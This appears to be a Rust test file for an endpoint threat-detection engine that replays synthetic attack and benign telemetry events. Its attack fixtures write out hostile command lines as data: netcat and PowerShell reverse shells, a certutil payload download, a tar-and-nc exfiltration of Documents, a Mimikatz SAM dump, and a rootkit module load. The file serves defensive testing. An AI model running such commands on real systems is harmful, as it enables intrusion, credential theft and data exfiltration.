    // A13 systemd user-unit persistence
    run(
        "A13_systemd_user_unit",
        "attack",
        vec![
            open(
                T0,
                6201,
                6200,
                1000,
                "bash",
                "bash",
                "bash",
                "/home/u/.config/systemd/user/dbus-helper.service",
            )
            .write(),
            exec(
                T0 + 1,
                6202,
                6200,
                1000,
                "systemctl",
                "bash",
                "systemctl --user enable --now dbus-helper",
                "/usr/bin/systemctl",
            ),
        ],
    );
    // A14 rootkit LKM from /tmp
    run(
        "A14_insmod_rootkit",
        "attack",
        vec![modload(T0, 6301, 0, 0, "unknown", "unknown", "diamorphine")],
    );
    // A15 ransomware burst: 40 renames/writes under /home in 10 s (production layer4 has NO ransomware template)
    let mut ev = vec![exec(
        T0,
        6401,
        6400,
        1000,
        "enc",
        "bash",
        "./enc /home/u",
        "/tmp/enc",
    )];
    for i in 0..40 {
        ev.push(
            open(
                T0 + (i / 4) as i64,
                6401,
                6400,
                1000,
                "enc",
                "bash",
                "./enc /home/u",
                &format!("/home/u/docs/f{}.docx.locked", i),
            )
            .write(),
        );
    }
    run("A15_ransomware_write_burst", "attack", ev);
    // A16 data staging: tar + nc upload of the archive on 9001 (siblings in one shell)
    run(
        "A16_tar_then_nc_upload",
        "attack",
        vec![
            exec(
                T0,
                6501,
                6500,
                1000,
                "tar",
                "bash",
                "tar czf /tmp/.d.tgz /home/u/Documents",
                "/usr/bin/tar",
            ),
            exec(
                T0 + 20,
                6502,
                6500,
                1000,
                "nc",
                "bash",
                "nc 198.51.100.7 9001",
                "/usr/bin/nc.openbsd",
            ),
            conn(
                T0 + 20,
                6502,
                6500,
                1000,
                "nc",
                "bash",
                "nc 198.51.100.7 9001",
                9001,
                "198.51.100.7",
            ),
        ],
    );
    // A17 lateral movement with stolen key from a non-standard tool path (attacker copies key to /tmp)
    run(
        "A17_ssh_with_stolen_key",
        "attack",
        vec![
            exec(
                T0,
                6601,
                6600,
                33,
                "ssh",
                "sh",
                "ssh -i /tmp/.k -o StrictHostKeyChecking=no root@10.0.0.9",
                "/usr/bin/ssh",
            ),
            open(
                T0,
                6601,
                6600,
                33,
                "ssh",
                "sh",
                "ssh -i /tmp/.k -o StrictHostKeyChecking=no root@10.0.0.9",
                "/tmp/.k",
            ),
            conn(
                T0 + 1,
                6601,
                6600,
                33,
                "ssh",
                "sh",
                "ssh -i /tmp/.k -o StrictHostKeyChecking=no root@10.0.0.9",
                22,
                "10.0.0.9",
            ),
        ],
    );
}

// ENGINE property: exec-linked temporal rules correlate unrelated processes host-wide when session_id == 1.
#[test]
fn ra2_a2_session_scope_property() {
    let mut d = production_engine();
    let a = exec(
        T0,
        7001,
        7000,
        0,
        "wget",
        "cron",
        "wget -q -O /var/lib/geoip/GeoLite2.tar.gz https://download.example/geo",
        "/usr/bin/wget",
    );
    let b = exec(
        T0 + 3,
        7101,
        7100,
        33,
        "bash",
        "sshd-session",
        "bash -c uptime",
        "/usr/bin/bash",
    );
    let _ = d.process_event(&a.0);
    let o = d.process_event(&b.0);
    assert!(o.temporal_hits.is_empty());
    println!("RA2A2-SESSION|same_session_id=1|unrelated wget(cron) then bash(other user ssh)|T={:?}|conf={:?}", o.temporal_hits, o.confidence);
    let mut d = production_engine();
    let mut a2 = a.clone();
    a2.0.session_id = 7000;
    let mut b2 = b.clone();
    b2.0.session_id = 7100;
    let _ = d.process_event(&a2.0);
    let o2 = d.process_event(&b2.0);
    println!(
        "RA2A2-SESSION|distinct_session_ids|same events|T={:?}|conf={:?}",
        o2.temporal_hits, o2.confidence
    );
}

// Unsafe/duplicate historical templates must not return through the default
// constructor; webshell behavior is covered by canonical temporal rules.
#[test]
fn ra2_a2_retired_default_templates_do_not_reappear() {
    for (label, nginx_exec_ts) in [
        ("nginx_started_1_day_ago", T0 - 86_400),
        ("nginx_started_5s_ago", T0 - 5),
    ] {
        let mut l4 = Layer4Engine::with_default_templates();
        let mut hits = Vec::new();
        for e in [
            exec(
                nginx_exec_ts,
                600,
                1,
                0,
                "nginx",
                "systemd",
                "nginx: worker process",
                "/usr/sbin/nginx",
            ),
            conn(
                T0 - 1,
                600,
                1,
                0,
                "nginx",
                "systemd",
                "nginx: worker process",
                9000,
                "127.0.0.1",
            ),
            exec(
                T0,
                5001,
                600,
                33,
                "sh",
                "nginx",
                "sh -c nc 198.51.100.7 4444 -e /bin/sh",
                "/usr/bin/dash",
            ),
            conn(
                T0,
                5001,
                600,
                33,
                "sh",
                "nginx",
                "sh -c ...",
                4444,
                "198.51.100.7",
            ),
        ] {
            hits.extend(l4.observe(&e.0));
        }
        println!("RA2A2-DEFAULTL4|webshell_network|{}|hits={:?}", label, hits);
    }
    let mut l4 = Layer4Engine::with_default_templates();
    let mut hits = Vec::new();
    let _ = l4.observe(
        &exec(
            T0,
            6401,
            6400,
            1000,
            "enc",
            "bash",
            "./enc /home/u",
            "/tmp/enc",
        )
        .0,
    );
    for i in 0..40 {
        hits.extend(
            l4.observe(
                &open(
                    T0 + (i / 4) as i64,
                    6401,
                    6400,
                    1000,
                    "enc",
                    "bash",
                    "./enc",
                    &format!("/home/u/docs/f{}.docx.locked", i),
                )
                .write()
                .0,
            ),
        );
    }
    println!(
        "RA2A2-DEFAULTL4|ransomware_write_burst|default_templates|hits={:?}",
        hits
    );
    assert!(hits.is_empty(), "creates alone cannot qualify ransomware");
    let mut l4 = Layer4Engine::with_default_templates();
    let mut hits = Vec::new();
    for e in [
        exec(
            T0,
            3001,
            3000,
            1000,
            "sudo",
            "bash",
            "sudo modprobe wireguard",
            "/usr/bin/sudo",
        ),
        exec(
            T0 + 1,
            3002,
            3001,
            0,
            "modprobe",
            "sudo",
            "modprobe wireguard",
            "/usr/sbin/modprobe",
        ),
        modload(T0 + 1, 3002, 3001, 0, "modprobe", "sudo", "wireguard"),
    ] {
        hits.extend(l4.observe(&e.0));
    }
    println!(
        "RA2A2-DEFAULTL4|user_root_module|sudo_modprobe|hits={:?}",
        hits
    );
    assert!(hits.is_empty());
}

// Windows shapes (uid is always 0 on Windows: platform-windows etw/codec.rs:37; process names keep ".exe").
#[test]
fn ra2_a2_windows_shapes() {
    let w = |e: E, sid: u32| {
        let mut e = e;
        e.0.session_id = sid;
        e
    };
    run(
        "W01_win_openssh_client",
        "benign",
        vec![
            w(
                exec(
                    T0,
                    8001,
                    8000,
                    0,
                    "ssh.exe",
                    "powershell.exe",
                    "ssh.exe admin@10.0.0.20",
                    "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
                ),
                640,
            ),
            w(
                open(
                    T0,
                    8001,
                    8000,
                    0,
                    "ssh.exe",
                    "powershell.exe",
                    "ssh.exe admin@10.0.0.20",
                    "C:\\Users\\u\\.ssh\\id_ed25519",
                ),
                640,
            ),
            w(
                conn(
                    T0 + 1,
                    8001,
                    8000,
                    0,
                    "ssh.exe",
                    "powershell.exe",
                    "ssh.exe admin@10.0.0.20",
                    22,
                    "10.0.0.20",
                ),
                640,
            ),
        ],
    );
    run("W02_win_thunderbird", "benign", vec![
        w(exec(T0, 8101, 8100, 0, "thunderbird.exe", "explorer.exe", "\"C:\\Program Files\\Mozilla Thunderbird\\thunderbird.exe\"", "C:\\Program Files\\Mozilla Thunderbird\\thunderbird.exe"), 640),
        w(open(T0 + 1, 8101, 8100, 0, "thunderbird.exe", "explorer.exe", "thunderbird.exe", "C:\\Users\\u\\AppData\\Roaming\\Thunderbird\\Profiles\\x.default-release\\logins.json"), 640),
        w(conn(T0 + 2, 8101, 8100, 0, "thunderbird.exe", "explorer.exe", "thunderbird.exe", 993, "203.0.113.10"), 640),
    ]);
    run(
        "W03_win_mimikatz_sam_read",
        "attack",
        vec![
            w(
                exec(
                    T0,
                    8201,
                    8200,
                    0,
                    "mimikatz.exe",
                    "cmd.exe",
                    "mimikatz.exe lsadump::sam",
                    "C:\\Users\\u\\Downloads\\mimikatz.exe",
                ),
                640,
            ),
            w(
                open(
                    T0,
                    8201,
                    8200,
                    0,
                    "mimikatz.exe",
                    "cmd.exe",
                    "mimikatz.exe lsadump::sam",
                    "C:\\Windows\\System32\\config\\SAM",
                ),
                640,
            ),
        ],
    );
    run("W04_win_powershell_revshell", "attack", vec![
        w(exec(T0, 8301, 8300, 0, "powershell.exe", "cmd.exe", "powershell -nop -c $c=New-Object Net.Sockets.TCPClient('198.51.100.7',4444);$s=$c.GetStream()", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"), 640),
        w(conn(T0, 8301, 8300, 0, "powershell.exe", "cmd.exe", "powershell -nop -c $c=New-Object Net.Sockets.TCPClient('198.51.100.7',4444)", 4444, "198.51.100.7"), 640),
    ]);
    run("W05_win_iis_webshell", "attack", vec![
        w(exec(T0 - 86_400, 900, 800, 0, "w3wp.exe", "svchost.exe", "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap DefaultAppPool", "c:\\windows\\system32\\inetsrv\\w3wp.exe"), 4),
        w(exec(T0, 8401, 900, 0, "cmd.exe", "w3wp.exe", "cmd.exe /c whoami & certutil -urlcache -f http://198.51.100.7:8000/a.exe a.exe", "C:\\Windows\\System32\\cmd.exe"), 4),
        w(conn(T0, 8401, 900, 0, "cmd.exe", "w3wp.exe", "cmd.exe /c ...", 8000, "198.51.100.7"), 4),
    ]);
}

// If killchain_ransomware_write_burst were simply re-added: does routine bulk writing in /home fire it?
#[test]
fn ra2_a2_ransomware_template_bulk_write_benign() {
    for (label, proc_name) in [
        ("npm_install_node_modules", "node"),
        ("git_clone_into_home", "git"),
        ("tar_extract_into_home", "tar"),
    ] {
        let mut l4 = Layer4Engine::with_default_templates();
        let mut hits = Vec::new();
        let _ = l4.observe(
            &exec(
                T0,
                9001,
                9000,
                1000,
                proc_name,
                "bash",
                proc_name,
                "/usr/bin/x",
            )
            .0,
        );
        for i in 0..200 {
            let e = open(
                T0 + (i / 40) as i64,
                9001,
                9000,
                1000,
                proc_name,
                "bash",
                proc_name,
                &format!("/home/dev/app/node_modules/pkg{}/index.js", i),
            )
            .write();
            hits.extend(l4.observe(&e.0));
        }
        hits.dedup();
        println!("RA2A2-RANSOM-BENIGN|{}|hits={:?}", label, hits);
        assert!(
            hits.is_empty(),
            "{label}: normal creates are not ransomware"
        );
    }
}

// Real-event replay (aggregate only). RA2_A2_CORPUS = JSON array extracted read-only from SIGFIX-corpus/events-full.json.
#[test]
#[ignore = "manual aggregate-only replay requires RA2_A2_CORPUS"]
fn ra2_a2_corpus_replay_aggregate() {
    let path =
        std::env::var("RA2_A2_CORPUS").expect("set RA2_A2_CORPUS for manual aggregate replay");
    let rows: Vec<serde_json::Value> =
        serde_json::from_str(&std::fs::read_to_string(path).unwrap()).unwrap();
    let mut by_agent: std::collections::BTreeMap<String, Vec<serde_json::Value>> =
        Default::default();
    for r in rows {
        by_agent
            .entry(r["agent"].as_str().unwrap_or("").to_string())
            .or_default()
            .push(r);
    }
    let mut counts: std::collections::BTreeMap<String, usize> = Default::default();
    let mut total = 0usize;
    let mut conf_counts: std::collections::BTreeMap<String, usize> = Default::default();
    for (_a, mut evs) in by_agent {
        evs.sort_by_key(|r| r["ts_unix"].as_i64().unwrap_or(0));
        let mut d = production_engine();
        for r in evs {
            let class = match r["event_class"].as_str().unwrap_or("") {
                "process_exec" => EventClass::ProcessExec,
                "process_exit" => EventClass::ProcessExit,
                "file_open" => EventClass::FileOpen,
                "network_connect" => EventClass::NetworkConnect,
                "dns_query" => EventClass::DnsQuery,
                "module_load" => EventClass::ModuleLoad,
                _ => continue,
            };
            let s = |k: &str| r[k].as_str().map(|v| v.to_string());
            let e = TelemetryEvent {
                ts_unix: r["ts_unix"].as_i64().unwrap_or(0),
                event_class: class,
                pid: r["pid"].as_u64().unwrap_or(0) as u32,
                ppid: r["ppid"].as_u64().unwrap_or(0) as u32,
                uid: r["uid"].as_u64().unwrap_or(0) as u32,
                process: s("process").unwrap_or_default(),
                parent_process: s("parent_process").unwrap_or_default(),
                session_id: r["session_id"].as_u64().unwrap_or(0) as u32,
                file_path: s("file_path"),
                file_write: r["file_write"].as_bool().unwrap_or(false),
                file_hash: None,
                dst_port: r["dst_port"].as_u64().map(|p| p as u16),
                dst_ip: s("dst_ip"),
                dst_domain: s("dst_domain"),
                command_line: s("command_line"),
                event_size: None,
                container_runtime: None,
                container_id: None,
                container_escape: false,
                container_privileged: false,
            };
            total += 1;
            let o = d.process_event(&e);
            for h in o.temporal_hits.iter().chain(o.kill_chain_hits.iter()) {
                *counts.entry(h.clone()).or_default() += 1;
            }
            *conf_counts
                .entry(format!("{:?}", o.confidence))
                .or_default() += 1;
        }
    }
    println!(
        "RA2A2-CORPUS|events={}|a2_hits={:?}|confidence={:?}",
        total, counts, conf_counts
    );
}

#[test]
#[ignore = "RAFIX-INTEGRATION: needs AML deleted-executable heuristic fix"]
fn rafix_chrome_after_update_not_high() {
    let mut engine = production_engine();
    let chrome = exec(
        T0,
        4002,
        4001,
        1000,
        "chrome",
        "chrome",
        "chrome --type=renderer",
        "/opt/google/chrome/chrome (deleted)",
    );
    assert!(engine.process_event(&chrome.0).confidence < Confidence::High);
}
